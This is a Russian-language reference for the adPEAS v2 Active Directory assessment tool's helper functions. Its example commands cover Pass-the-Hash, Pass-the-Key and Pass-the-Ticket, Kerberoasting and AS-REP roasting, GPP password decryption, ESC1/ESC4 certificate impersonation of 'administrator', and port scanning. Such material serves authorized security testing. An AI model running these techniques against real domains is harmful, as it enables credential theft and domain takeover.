# Справочник вспомогательных функций

Справочник служебных и вспомогательных функций adPEAS v2.

---

## Обзор

Вспомогательные функции обеспечивают работу основных операций и проверок безопасности.

| Категория | Функции |
|----------|-----------|
| [Управление сеансом](#session-management) | Connect-adPEAS, Disconnect-adPEAS, Get-adPEASSession, Ensure-LDAPConnection |
| [Журналирование](#logging) | Write-Log |
| [Автодополнение Tab](#tab-completion) | Build-CompletionCache, Clear-CompletionCache, Get-CompletionCacheStats |
| [Аутентификация Kerberos](#kerberos-authentication) | Invoke-KerberosAuth, Request-ServiceTicket, Import-KerberosTicket, Invoke-UnPACTheHash |
| [Получение хешей из пароля](#password-hash-derivation) | Get-Hash |
| [Утилиты SID и ACL](#sid-and-acl-utilities) | ConvertFrom-SID, ConvertTo-SID, ConvertTo-LDAPSIDHex, Test-IsPrivileged, Get-ObjectOwner |
| [Расшифровка учётных данных](#credential-decryption) | ConvertFrom-GPPPassword, ConvertFrom-VBE |
| [Функции тестирования](#testing-functions) | Invoke-Kerberoast, Invoke-ASREPRoast |
| [Запрос сертификатов AD CS](#adcs-certificate-enrollment) | Request-ADCSCertificate |
| [Сетевые утилиты](#network-utilities) | Invoke-PortScan, Invoke-SMBAccess, Resolve-adPEASName |

---

## Управление сеансом

### Connect-adPEAS

Устанавливает аутентифицированное LDAP-соединение с Active Directory.

```powershell
# Аутентификация Windows
Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth

# С явными учётными данными
Connect-adPEAS -Domain "contoso.com" -Credential (Get-Credential)

# С именем пользователя и паролем
Connect-adPEAS -Domain "contoso.com" -Username "admin" -Password "pass"

# С сертификатом (PKINIT)
Connect-adPEAS -Domain "contoso.com" -Certificate "user.pfx" -CertificatePassword "pass"

# С сертификатом (Pass-the-Cert/Schannel, Kerberos не требуется)
Connect-adPEAS -Domain "contoso.com" -Certificate "user.pfx" -ForcePassTheCert

# С NT-хешем
Connect-adPEAS -Domain "contoso.com" -Username "admin" -NTHash "32ED87BDB5FDC5E9CBA88547376818D4"

# Использование SimpleBind (без Kerberos)
Connect-adPEAS -Domain "contoso.com" -Username "admin" -Password "pass" -ForceSimpleBind

# Подмена контекста NTLM с сохранением существующих билетов Kerberos
Connect-adPEAS -Domain "contoso.com" -Username "admin" -Password "pass" -ForceNTLM
```

Подробности см. в [справочнике методов аутентификации](03-Authentication-Methods.md).

---

### Disconnect-adPEAS

Закрывает LDAP-соединение и очищает данные сеанса.

```powershell
Disconnect-adPEAS
```

**Последствия вызова**:
- Освобождается объект LdapConnection.
- Освобождается соединение глобального каталога (`$Script:GCConnection`), если оно было установлено.
- Очищается `$Script:LdapConnection`.
- Очищается `$Script:LDAPContext`.
- Очищается кеш разрешения SID.

---

### Get-adPEASSession

Показывает сведения о текущем сеансе и проверяет работоспособность соединения.

```powershell
# Показать сведения о сеансе
Get-adPEASSession

# Проверить соединение
Get-adPEASSession -TestConnection

# Тихий режим (возвращает логическое значение)
$healthy = Get-adPEASSession -TestConnection -Quiet
```

**Возвращаемые сведения**:
- Имя домена.
- Контроллер домена.
- Способ аутентификации.
- Аутентифицированный пользователь.
- NT-хеш (если извлечён через UnPAC-the-Hash после аутентификации PKINIT).
- Протокол соединения (LDAP/LDAPS).

---

### Build-CompletionCache

Вручную создаёт или обновляет кеш автодополнения клавишей Tab.

```powershell
# Построить кеш для всех классов объектов
Build-CompletionCache

# Построить кеш только для указанных классов
Build-CompletionCache -ObjectTypes @('Users', 'Groups')

# Доступные типы: Users, Computers, Groups, GPOs, All (по умолчанию)
```

**Примечание.** Требуется действующее LDAP-соединение: сначала вызовите `Connect-adPEAS`.

---

### Clear-CompletionCache

Удаляет все данные кеша автодополнения.

```powershell
Clear-CompletionCache
```

**Когда использовать:** при переходе к другому домену либо устаревании кеша.

---

### Get-CompletionCacheStats

Возвращает статистику текущего кеша автодополнения.

```powershell
Get-CompletionCacheStats
```

**Пример результата**:
```powershell
Users       : 523
Computers   : 87
Groups      : 142
GPOs        : 31
Total       : 783
CacheExists : True
```

---

### Устройство кеша

**Какие значения кешируются**:

| Тип объекта | Атрибут в кеше | Пример |
|-------------|------------------|---------|
| Пользователи | sAMAccountName | `administrator`, `john.doe` |
| Компьютеры | sAMAccountName (без $) | `DC01`, `WS001` |
| Группы | sAMAccountName | `Domain Admins`, `IT-Support` |
| GPO | displayName | `Default Domain Policy` |

**Важные примечания**:
- Кеш хранится только в памяти и очищается при завершении сеанса PowerShell.
- Кеш НЕ обновляется автоматически: для обновления вызовите `Build-CompletionCache`.
- При одном нажатии Tab показывается не более 50 вариантов.
- Имена с пробелами автоматически заключаются в кавычки.
- В больших доменах (более 10 000 объектов) построение кеша может занять несколько секунд.

---

## Аутентификация Kerberos

### Invoke-KerberosAuth

Выполняет обмен Kerberos AS-REQ/AS-REP для получения TGT.

```powershell
# По паролю
$tgt = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -Password "P@ss"

# Overpass-the-Hash
$tgt = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -NTHash "32ED87BDB5FDC5E9CBA88547376818D4"

# Pass-the-Key (AES256): ключ зависит от пользователя и домена; пример источника — Mimikatz sekurlsa::ekeys
$tgt = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -AES256Key "YOUR_64_HEX_CHAR_KEY"

# PKINIT (сертификат)
$tgt = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -Certificate "user.pfx"

# Сохранение TGT в файл
$tgt = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -Password "P@ss" -OutputKirbi "admin.kirbi"

# Вернуть только билет Base64 для передачи в другой инструмент
$ticketB64 = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -NTHash "32ED87..." -OutputTicketOnly
```

**Параметры**:

| Параметр | Тип | Описание |
|-----------|------|-------------|
| `-UserName` | String | sAMAccountName пользователя |
| `-Domain` | String | FQDN целевого домена |
| `-DomainController` | String | Определённый сервер KDC (необязательно) |
| `-Credential` | PSCredential | Объект PSCredential |
| `-Password` | String | Пароль открытым текстом |
| `-NTHash` | String | NT-хеш в HEX из 32 символов (Overpass-the-Hash) |
| `-AES256Key` | String | Ключ AES256 в HEX из 64 символов (Pass-the-Key) |
| `-AES128Key` | String | Ключ AES128 в HEX из 32 символов (Pass-the-Key) |
| `-Certificate` | String/X509Certificate2 | Путь к PFX, сертификат в Base64 или объект X509Certificate2 (PKINIT) |
| `-CertificatePassword` | String | Пароль PFX (по умолчанию пустой) |
| `-PreferredEType` | Int | 18=AES256, 17=AES128, 23=RC4 |
| `-OutputKirbi` | String | Путь для сохранения TGT в файле .kirbi |
| `-OutputTicketOnly` | Switch | Вернуть KRB-CRED (kirbi) в Base64 для непосредственного использования |
| `-NoPAC` | Switch | Запросить TGT без PAC |

**Возвращаемый объект** (по умолчанию):
```powershell
@{
    Success        = $true
    Method         = "Password (AES256)"
    UserName       = "admin"
    Domain         = "CONTOSO.COM"
    EncryptionType = 18
    Ticket         = "base64..."      # TGT в исходном виде
    SessionKey     = "base64..."      # Ключ сеанса
    TicketBytes    = [byte[]]         # Байты билета
    SessionKeyBytes = [byte[]]        # Байты ключа
}
```

**Возвращаемое значение** (с `-OutputTicketOnly`):
```powershell
# Возвращает KRB-CRED (формат kirbi) в Base64, включая ключ сеанса!
# Можно напрямую передать в Connect-adPEAS -Kirbi или Rubeus ptt
"doIKxjCCCsKgAwIBBaEDAgEWooIK..."
```

**Пример использования** (с `-OutputTicketOnly`):
```powershell
# Получить TGT и использовать для подключения
$kirbi = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -NTHash "32ED87..." -OutputTicketOnly
Connect-adPEAS -Domain "contoso.com" -Kirbi $kirbi

# Сразу поместить билет в буфер обмена
Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -Password "pass" -OutputTicketOnly | Set-Clipboard

# Использовать с Rubeus
$ticket = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -AES256Key "4a3b2c1d..." -OutputTicketOnly
# Rubeus.exe ptt /ticket:$ticket
```

---

### Request-ServiceTicket

Запрашивает сервисный билет TGS на основе существующего TGT.

```powershell
# Сначала получить TGT
$tgt = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -Password "pass"

# Запросить сервисный билет LDAP
$tgs = Request-ServiceTicket -TGT $tgt.TicketBytes `
    -SessionKey $tgt.SessionKeyBytes `
    -SessionKeyType $tgt.EncryptionType `
    -ServicePrincipalName "ldap/dc01.contoso.com" `
    -Domain "contoso.com" `
    -DomainController "dc01.contoso.com" `
    -UserName "admin"
```

**Возвращаемый объект**:
```powershell
@{
    Success       = $true
    ServiceName   = "ldap/dc01.contoso.com"
    Ticket        = "base64..."
    SessionKey    = "base64..."
    TicketBytes   = [byte[]]
}
```

---

### Import-KerberosTicket

Импортирует билет Kerberos в сеанс Windows (Pass-the-Ticket).

```powershell
# Импорт TGT из байтов
Import-KerberosTicket -TicketBytes $tgt.TicketBytes `
    -SessionKey $tgt.SessionKeyBytes `
    -SessionKeyType $tgt.EncryptionType

# Импорт из файла .kirbi
Import-KerberosTicket -Kirbi "admin.kirbi"

# Импорт из Base64
Import-KerberosTicket -TicketBase64 "doIFxjCC..."
```

**Требования:** права администратора не нужны (используется LsaConnectUntrusted).

---

## Вычисление хешей по паролю

### Get-Hash

Вычисляет распространённые хеши пароля и ключи шифрования Kerberos по паролю открытым текстом. Возвращает строки в HEX, пригодные для передачи в adPEAS, Rubeus, Mimikatz или Hashcat.

```powershell
# Только пароль: хеши RC4, MD5/SHA
Get-Hash -Password "P@ssw0rd"

# Вместе с пользователем: дополнительно DCC/DCC2
Get-Hash -Password "P@ssw0rd" -UserName "admin"

# Полный набор, включая AES-ключи Kerberos
Get-Hash -Password "P@ssw0rd" -Domain "contoso.com" -UserName "admin"
```

**Пример полного результата**:
```
UserName : admin
Domain   : CONTOSO.COM
Password : P@ssw0rd
RC4      : E19CCF75EE54E06B06A5907AF13CEF42
AES128   : 8D7B15C4652FEDACC8CFAB8F49347A8B
AES256   : 72D552D91EA1A464381E0B63E074510E83944C0456747B5DC4171C88254AEEC6
DCC      : B27B6F1A2EFC3D...
DCC2     : 2139D292C27FE1...
MD5      : 202CB962AC5907...
SHA1     : 40BD001563085F...
SHA256   : A665A459204224...
SHA512   : 3C9909AFEC2535...
```

**Параметры**:

| Параметр | Тип | Описание |
|-----------|------|-------------|
| `-Password` | String | Пароль открытым текстом (обязателен) |
| `-Domain` | String | FQDN домена (необязателен, нужен для AES-ключей) |
| `-UserName` | String | sAMAccountName (необязателен, нужен для AES и DCC/DCC2) |

**Форматы хешей**:

| Хеш | Алгоритм | Требуется | Применение |
|------|-----------|----------|---------|
| RC4 (NT-Hash) | MD4(UTF-16LE(password)) | Только пароль | Аутентификация NTLM, Pass-the-Hash |
| AES128 | PBKDF2-SHA1 + DK (RFC 3962) | Домен и UserName | Kerberos etype 17 |
| AES256 | PBKDF2-SHA1 + DK (RFC 3962) | Домен и UserName | Kerberos etype 18 |
| DCC | MD4(NT-Hash \|\| UTF-16LE(lowercase(user))) | UserName | mscache v1 (до Vista) |
| DCC2 | PBKDF2-HMAC-SHA1(DCC, user, 10240) | UserName | mscachev2 (Vista и новее) |
| MD5 | MD5(UTF-8(password)) | Только пароль | Устаревшие системы |
| SHA1 | SHA1(UTF-8(password)) | Только пароль | Различные системы |
| SHA256 | SHA256(UTF-8(password)) | Только пароль | Современные системы |
| SHA512 | SHA512(UTF-8(password)) | Только пароль | Современные системы |

**Использование с Connect-adPEAS**:

```powershell
$h = Get-Hash -Password "P@ssw0rd" -Domain "contoso.com" -UserName "admin"

# Overpass-the-Hash
Connect-adPEAS -Domain "contoso.com" -Username "admin" -NTHash $h.RC4

# Pass-the-Key
Connect-adPEAS -Domain "contoso.com" -Username "admin" -AES256Key $h.AES256
```

**Примечание.** RC4, MD5, SHA1, SHA256 и SHA512 не зависят от домена: один пароль всегда даёт один и тот же хеш. В AES и DCC/DCC2 для формирования соли используется имя пользователя (а для AES также домен).

---

## Утилиты SID и ACL

### ConvertFrom-SID

Преобразует SID в понятное имя (DOMAIN\Username).

```powershell
# Преобразование одного SID
$name = ConvertFrom-SID -SID "S-1-5-21-123456789-123456789-123456789-500"
# Результат: CONTOSO\Administrator

# Общеизвестные SID разрешаются локально
$name = ConvertFrom-SID -SID "S-1-5-18"
# Результат: NT AUTHORITY\SYSTEM
```

**Возможности**:
- Кеширование разрешённых SID для ускорения запросов.
- Общеизвестные SID обрабатываются без LDAP-запросов.
- Для SID из других доменов того же леса автоматически используется глобальный каталог (порты 3268/3269). Соединение GC создаётся по необходимости через `Get-GCConnection` и сохраняется в `$Script:GCConnection` на время сеанса.
- Если GC недоступен, возвращается представление на основе RID (например, `FOREIGN\DomainAdmins (RID:512)`).
- При невозможности разрешить имя возвращается исходный SID.

---

### ConvertTo-LDAPSIDHex

Преобразует строковый SID в двоичный LDAP-формат с HEX-экранированием для фильтров.

```powershell
$sidHex = ConvertTo-LDAPSIDHex -SIDString "S-1-5-21-123456789-123456789-123456789-500"
# Результат: \01\05\00\00\00\00\00\05\15\00\00\00...

# Использование в LDAP-фильтре
$user = Get-DomainObject -LDAPFilter "(objectSid=$sidHex)"
```

---

### Test-IsPrivileged

Определяет категорию безопасности субъекта в Active Directory. Возвращает подробный PSCustomObject со сведениями о классификации.

```powershell
# Проверка по SID с подробным результатом
$result = Test-IsPrivileged -Identity "S-1-5-21-...-512"
$result.Category      # "Privileged"
$result.IsPrivileged  # $true
$result.Reason        # "Privileged group (RID suffix -512)"

# Проверка группы операторов
$result = Test-IsPrivileged -Identity "S-1-5-32-548"
$result.Category      # "Operator"
$result.IsPrivileged  # $false (по умолчанию операторы не считаются привилегированными)

# Считать операторов привилегированными
$result = Test-IsPrivileged -Identity "S-1-5-32-548" -IncludeOperators
$result.IsPrivileged  # $true

# Проверка служебной группы Exchange
$result = Test-IsPrivileged -Identity "Organization Management"
$result.Category      # "ExchangeService"
$result.IsPrivileged  # $false (штатные права, не считается привилегированной группой)
```

**Параметры**:

| Параметр | Описание |
|-----------|-------------|
| `-Identity` | SID, DN, объект AD либо sAMAccountName для проверки |
| `-IncludeOperators` | Считать категорию Operator привилегированной |
| `-NoCache` | Не использовать кеш результатов |

**Возвращаемый объект** (всегда PSCustomObject):

| Свойство | Тип | Описание |
|----------|------|-------------|
| `IsPrivileged` | Boolean/Null | `$true`/`$false`/`$null` (учитывает IncludeOperators) |
| `Category` | String | Privileged, Operator, ExchangeService, BroadGroup, Standard, Unknown |
| `Reason` | String | Причина выбранной категории |
| `MatchedSID` | String | Совпавший SID (либо `$null`) |
| `MatchedGroup` | String | Имя совпавшей группы при определении по членству (либо `$null`) |
| `Identity` | Object | Исходный аргумент идентификатора |

**Категории**:

| Категория | IsPrivileged (по умолчанию) | Примеры |
|----------|------------------------|----------|
| Privileged | `$true` | Domain Admins, Enterprise Admins, SYSTEM, Administrators |
| Operator | `$false` | Account/Server/Backup/Print Operators |
| ExchangeService | `$false` | Organization Management, Exchange Servers (штатные полномочия) |
| BroadGroup | `$false` | Domain Users, Authenticated Users, Everyone |
| Standard | `$false` | Обычные пользователи и группы |
| Unknown | `$null` | Не удалось определить субъект |

**Значения Reason**:
- `"Privileged identity (static SID)"` — общеизвестный привилегированный SID.
- `"Privileged group (RID suffix -512)"` — привилегированная группа, определённая по RID домена.
- `"Operator group (static SID)"` — SID одной из групп операторов.
- `"Member of privileged group"` — вложенное членство в привилегированной группе.
- `"sIDHistory contains privileged SID (SID History Injection risk)"` — КРИТИЧЕСКИЙ риск: привилегированный SID в sIDHistory.
- И другие значения.

**Выявление внедрения SID History**:

`Test-IsPrivileged` автоматически выявляет признаки внедрения SID History: проверяет, содержит ли атрибут sIDHistory субъекта привилегированные SID.

```powershell
$result = Test-IsPrivileged -Identity "suspicious_user"
if ($result.Reason -like "*sIDHistory*") {
    # КРИТИЧНО: в sIDHistory этой учётной записи есть привилегированные SID!
    # Возможно внедрение SID History
}
```

---

### Get-ObjectOwner

Получает владельца объекта AD.

```powershell
$owner = Get-ObjectOwner -DistinguishedName "CN=Computer01,CN=Computers,DC=contoso,DC=com"
```

**Возвращает**:
```powershell
@{
    OwnerSID  = "S-1-5-21-..."
    OwnerName = "CONTOSO\Domain Admins"
}
```

---

## Расшифровка учётных данных

### ConvertFrom-GPPPassword

Расшифровывает пароли Group Policy Preferences (GPP).

```powershell
# Расшифровка GPP cpassword
$clearText = ConvertFrom-GPPPassword -EncryptedPassword "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

**Предыстория:** пароли GPP шифруются опубликованным ключом AES и могут быть расшифрованы.

**Где встречается:** XML-файлы в SYSVOL (Groups.xml, Drives.xml и др.).

---

### ConvertFrom-VBE

Декодирует сценарии VBScript Encoded (.vbe).

```powershell
# Декодировать строку в VBE
$script = ConvertFrom-VBE -EncodedScript "#@~^AAAA..."

# Декодировать содержимое файла
$vbeContent = Get-Content "logon.vbe" -Raw
$script = ConvertFrom-VBE -EncodedScript $vbeContent
```

**Параметр:** `-EncodedScript` (String, обязательный, принимает данные конвейера) — содержимое VBE для декодирования.

**Где встречается:** сценарии входа могут быть закодированы и содержать учётные данные.

---

## Функции тестирования

### Invoke-Kerberoast

Универсальный модуль Kerberoasting: автоматически выбирает метод с учётом типа аутентификации.

**Два метода Kerberoasting (выбор автоматический):**
- **Windows API:** использует существующий кеш билетов Windows (Kerberos/SSPI).
- **В памяти:** собственная реализация Kerberos (аутентификация SimpleBind либо явно заданные учётные данные).

**Параметры:**

| Параметр | Тип | Описание |
|-----------|------|-------------|
| `InputObject` | PSCustomObject | Объект из конвейера `Get-DomainUser` |
| `SAMAccountName` | String | sAMAccountName целевого пользователя |
| `SPN` | String | Целевое имя участника службы SPN |
| `Domain` | String | Целевой домен |
| `Server` | String | Используемый контроллер домена |
| `Credential` | PSCredential | Учётные данные для метода в памяти |
| `Username` | String | Имя пользователя для метода в памяти |
| `Password` | String | Пароль для метода в памяти |
| `CleanupTickets` | Switch | Удалить билет TGS из кеша после извлечения (только Windows API) |

**Примеры использования:**

```powershell
# Конвейер от Get-DomainUser (рекомендуется)
Get-DomainUser -SPN -Enabled | Invoke-Kerberoast

# По SAMAccountName (автоматический поиск SPN)
Invoke-Kerberoast -SAMAccountName "svc_sql"

# Непосредственно по SPN (автоматический поиск имени пользователя)
Invoke-Kerberoast -SPN "MSSQLSvc/db01.contoso.com:1433"

# Оба параметра (быстрее, дополнительные запросы не нужны)
Invoke-Kerberoast -SAMAccountName "svc_sql" -SPN "MSSQLSvc/db01.contoso.com:1433"

# Явные учётные данные (выбирается метод в памяти)
Invoke-Kerberoast -SAMAccountName "svc_sql" -Credential (Get-Credential)
```

**Возвращаемый объект:**
```powershell
[PSCustomObject]@{
    Success          = $true/$false
    SAMAccountName   = "svc_sql"
    SPN              = "MSSQLSvc/db01.contoso.com:1433"
    Hash             = "$krb5tgs$23$*svc_sql$CONTOSO.COM$MSSQLSvc/db01...*"
    EncryptionType   = 23
    EncryptionTypeName = "RC4-HMAC"
    HashcatMode      = 13100
    Method           = "WindowsAPI" / "InMemory"
    Error            = $null / "Error message"
}
```

**Результат:** хеш, совместимый с Hashcat (режим 13100 для RC4, 19700 для AES).

---

### Invoke-ASREPRoast

Отправляет AS-REQ без предварительной аутентификации и извлекает AS-REP-хеш для автономного подбора. Использует непосредственно протокол Kerberos (TCP/UDP, порт 88) для связи с KDC.

**Параметры:**

| Параметр | Тип | Описание |
|-----------|------|-------------|
| `SAMAccountName` | String | sAMAccountName целевого пользователя (обязателен) |
| `Domain` | String | FQDN целевого домена (необязательно, берётся из сеанса) |
| `DomainController` | String | Целевой DC (необязательно, из сеанса либо автообнаружение) |

**Примеры использования:**

```powershell
# При активном сеансе (рекомендуется): домен/DC берутся из Connect-adPEAS
$result = Invoke-ASREPRoast -SAMAccountName "vulnuser"

# Домен задан явно
$result = Invoke-ASREPRoast -SAMAccountName "vulnuser" -Domain "contoso.com"

# Указан определённый контроллер домена
$result = Invoke-ASREPRoast -SAMAccountName "vulnuser" -Domain "contoso.com" -DomainController "dc01.contoso.com"

# Проверка результата
if ($result.Success) {
    $result.Hash          # Хеш для Hashcat/John
    $result.Severity      # "CRITICAL" (RC4), "HIGH" (AES128), "MEDIUM" (AES256)
}
```

**Возвращаемый объект:**
```powershell
[PSCustomObject]@{
    SAMAccountName     = "vulnuser"
    Success            = $true/$false
    EncryptionType     = 23                  # 23=RC4, 17=AES128, 18=AES256
    EncryptionTypeName = "RC4-HMAC"
    Severity           = "CRITICAL"          # В зависимости от шифрования
    Description        = "Very fast to crack"
    Hash               = "$krb5asrep$23$vulnuser@CONTOSO.COM:checksum$encrypted"
    Error              = $null / "Error message"
}
```

**Результат:** хеш, совместимый с Hashcat (режим 18200 для RC4, 19600 для AES).

---

## Запрос сертификатов AD CS

### Request-ADCSCertificate

Запрашивает сертификат в центре сертификации AD CS с автоматическим определением доступного способа подачи заявки и резервными вариантами.

**Способы подачи заявки** (автоматический переход к резервному):
1. **HTTPS Web Enrollment** (`/certsrv/`) — основной метод.
2. **HTTP Web Enrollment** (`/certsrv/`) — резервный, если HTTPS недоступен.
3. **ICertRequest COM/RPC** (DCOM) — резервный, если веб-регистрация отключена или блокируется.

```powershell
# ESC1: запрос сертификата на имя другого пользователя
Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "administrator"

# ESC4: временно изменить шаблон и подать заявку
Request-ADCSCertificate -TemplateName "WebServer" -ModifyTemplate -Impersonate "administrator"

# Указать УЦ вручную
Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -Subject "CN=John"

# Пользовательские SAN
Request-ADCSCertificate -TemplateName "User" -Subject "CN=Admin" -UPN "admin@contoso.com"
Request-ADCSCertificate -TemplateName "Computer" -Subject "CN=SRV01" -DNS "srv01.contoso.com"

# PFX без пароля (для сценариев)
Request-ADCSCertificate -TemplateName "User" -Subject "CN=Test" -NoPassword

# Явные учётные данные
Request-ADCSCertificate -TemplateName "User" -Credential (Get-Credential)
```

**Параметры**:
- `-CAServer` — FQDN УЦ (автообнаружение, если параметр не задан и есть сеанс).
- `-TemplateName` — имя шаблона сертификата (обязательное).
- `-Impersonate` — вспомогательный параметр: автоматически задаёт Subject и подходящий SAN.
- `-Subject` — субъект сертификата (префикс CN= добавляется, если отсутствует).
- `-UPN` — UPN в SAN (например, `admin@contoso.com`).
- `-DNS` — DNS-имя в SAN (например, `srv01.contoso.com`).
- `-ModifyTemplate` — ESC4: резервная копия → изменение → заявка → восстановление.
- `-NoPassword` — экспорт PFX без пароля.
- `-UseHTTP` — принудительный HTTP (без HTTPS).
- `-OutputPath` — пользовательский путь к PFX.
- `-PassThru` — возврат объекта результата для сценариев.

**Возвращаемый результат** (с `-PassThru`):
```powershell
[PSCustomObject]@{
    Success       = $true
    PFXPath       = ".\administrator_20260222_125500.pfx"
    PFXPassword   = "K8#mP2@xL9!nQ4$wR7"
    CAServer      = "ca01.contoso.com"
    TemplateName  = "VulnTemplate"
    RequestID     = 142
}
```

**Подробности резервного COM/RPC**:
- Автоматически выбирается, когда веб-регистрация завершается с ошибкой соединения/сети.
- Использует COM-интерфейс `ICertRequest` через DCOM (порт 135 и динамические порты).
- Сразу возвращает сертификат (отдельное получение не требуется).
- Требует тех же разрешений, что и веб-регистрация (право Enroll на шаблоне).

**Особые случаи**:
- Веб-регистрация отключена → автоматически используется COM/RPC.
- Брандмауэр блокирует HTTP/HTTPS → пробуется COM/RPC (если разрешён DCOM).
- Доступен только HTTP → автоматический переход с HTTPS на HTTP.
- Ручное вмешательство не требуется: подходящий способ выбирается автоматически.

---

## Утилиты LAPS

### Get-LAPSGPOConfig

Разбирает настройки устаревшего Microsoft LAPS из файлов Registry.pol групповых политик. Запрашивает все GPO и проверяет пути SYSVOL на наличие параметра LAPS AdminAccountName.

```powershell
# Использовать DC текущего сеанса (по умолчанию)
$config = Get-LAPSGPOConfig

# Указать контроллер домена
$config = Get-LAPSGPOConfig -DomainController "dc01.contoso.com"
```

**Параметр:** `-DomainController` (String, необязательный) — DC для доступа к SYSVOL.

**Возвращает:** Hashtable с отображаемым именем GPO в качестве ключа и настроенным AdminAccountName в качестве значения.

---

### Get-OUPermissions

Анализирует разрешения на организационную единицу (OU).

```powershell
$perms = Get-OUPermissions -DistinguishedName "OU=Admins,DC=contoso,DC=com"

# Проверка заданного типа разрешений
$perms = Get-OUPermissions -DistinguishedName "OU=Admins,DC=contoso,DC=com" -CheckType "LAPS"
```

**Типы проверок** (ValidateSet):
- `All` — все проверки разрешений (по умолчанию).
- `GenericAll` — полный доступ.
- `GenericWrite` — общее право записи (включает WriteProperty для всех атрибутов).
- `WriteDacl` — изменение ACL (по сути, полный контроль).
- `WriteOwner` — получение владения (по сути, полный контроль).
- `PasswordReset` — сброс пароля (расширенное право).
- `AccountControl` — изменение userAccountControl / User-Account-Restrictions.
- `GroupMembership` — изменение членства в группе (атрибут member).
- `SPNModification` — изменение SPN (servicePrincipalName, Validated-SPN).
- `DNSHostName` — изменение DNS-имени (dNSHostName, Validated-DNS-Host-Name).
- `ScriptPath` — изменение пути сценария входа (scriptPath).
- `Delegation` — изменение атрибутов делегирования (msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity).
- `LAPS` — чтение пароля LAPS (устаревший ms-Mcs-AdmPwd и атрибуты Windows LAPS).
- `CredentialRoaming` — чтение атрибутов перемещаемых учётных данных пользователей (ms-PKI-DPAPIMasterKeys, ms-PKI-AccountCredentials, ms-PKI-RoamingTimeStamp).
- `ObjectCreation` — право CreateChild (создание User, Computer, Group, OU).
- `GPOLinking` — изменение привязки GPO (атрибут gPLink у OU).

**Поля находки:** `CheckType`, `Right`, `Principal`, `SID`, `Severity`, `InheritedFrom`. Для находок `CredentialRoaming` также указывается `GrantsControlAccess`: конфиденциальный атрибут требует **одновременно** `READ_PROPERTY` и `CONTROL_ACCESS`, а неконфиденциальный — только первого права. Решает схема AD; только вызывающая сторона знает эту характеристику.

---

## Утилиты GPO

### Get-GPOLinkage

Запрашивает LDAP-объекты с атрибутом `gPLink` и возвращает Hashtable, сопоставляющую GUID GPO и места привязки. Не принимает параметров, использует активный сеанс LDAP.

```powershell
# Получить сведения обо всех привязках GPO
$linkage = Get-GPOLinkage
$linkage["{6AC1786C-016F-11D2-945F-00C04fB984F9}"]  # Массив OU, к которым привязана GPO
```

**Возвращает:** Hashtable, где ключ — GUID GPO (верхний регистр, с фигурными скобками), а значение — массив объектов мест привязки.

---

## Сетевые утилиты

### Invoke-PortScan

Быстрое TCP-сканирование установлением соединения с текущего компьютера. Не требует установки программы или драйвера;
в отличие от `Test-NetConnection`, не ждёт отдельного тайм-аута для каждого порта. Соединения открываются
пачками (`-BatchSize`, по умолчанию 256), и каждой пачке назначается общий срок ожидания (`-TimeoutMs`, 1000 мс).
Неответивший порт расходует один тайм-аут на пачку, а не на каждую попытку: например, 254 узла
по 16 портов по умолчанию, отбрасывающие все пакеты, будут проверены примерно за 20 секунд.

Порт считается открытым после успешного TCP-соединения; полезная нагрузка по нему не передаётся. Отказ
в соединении и фильтрация не различаются: Windows может отвечать на отказ лишь после повторных попыток
примерно в течение одной секунды.

**Цели:**
- **Заданные** через `-Target` или конвейер: IPv4-адреса, сети (`10.1.2.0/24`, вплоть до /16,
  без сетевого и широковещательного адреса), диапазоны (`10.1.2.10-50`,
  `10.1.2.10-10.1.3.20`) и имена узлов в произвольном сочетании, а также объекты функций `Get-Domain*`,
  из которых берётся `dNSHostName`. Имя разрешается однократно локальным разрешителем перед
  сканированием. Пустой конвейер не запускает проверку адресов.
- **`-DomainComputers`**: включённые компьютеры домена, входившие в систему за последние 30 дней
  (определяется `-ActiveDays`), с DNS-именами внутри собственного домена. Адреса берутся из
  интегрированных с AD зон DNS по LDAP, как в `Get-NetworkMap`. Если имя отсутствует в зонах,
  его разрешает контроллер домена, но не другой сервер. Заданные отдельно цели и компьютеры
  домена сканируются вместе.

Вызов без `-Target`/данных конвейера и без `-DomainComputers` завершается ошибкой, а не сканированием всего домена.
`Invoke-adPEAS` не запускает сканирование портов.

Каждый адрес сканируется однократно, даже если указан несколькими способами. Для пропущенных целей
возвращается причина: неподходящий формат, имя без IP-адреса, компьютер вне домена
либо без DNS-имени.

**Параметры:**

| Параметр | Тип | Описание |
|-----------|------|-------------|
| `Target` | String[] | IP-адреса, сети, диапазоны или имена; данные конвейера по значению или свойству `dNSHostName` |
| `Port` | String[] | Порты и диапазоны: `445`, `'22,80,443'`, `'1-1024'`. По умолчанию 16 портов ниже |
| `TimeoutMs` | Int | Общее время ожидания одной пачки соединений; по умолчанию 1000 |
| `BatchSize` | Int | Число одновременных соединений; по умолчанию 256 |
| `DomainComputers` | Switch | Дополнительно сканировать активные компьютеры домена |
| `ActiveDays` | Int | С `-DomainComputers`: возраст последнего входа; по умолчанию 30 дней |
| `ExportOpenPorts` | String | CSV с открытыми портами (по строке на порт): `IPAddress`, `HostName`, `Port`, `Service` |
| `PassThru` | Switch | По объекту на адрес с открытыми портами: `ComputerName`, `IPAddress`, `OpenPorts` |
| `Domain` / `Server` / `Credential` | | Параметры подключения для `-DomainComputers` |

Порты по умолчанию: 22, 80, 88, 135, 389, 443, 445, 636, 1433, 3389, 5985, 5986, 8080, 8443,
9080, 9443. Это не все службы, но типовые порты, по которым можно судить о доступности следующих
подключений: удалённая оболочка (SSH, RPC, RDP, WinRM через HTTP/HTTPS), доменные службы
(Kerberos, LDAP, LDAPS; последний необходим для `-PassTheCert`), файлы (SMB), база данных (MSSQL)
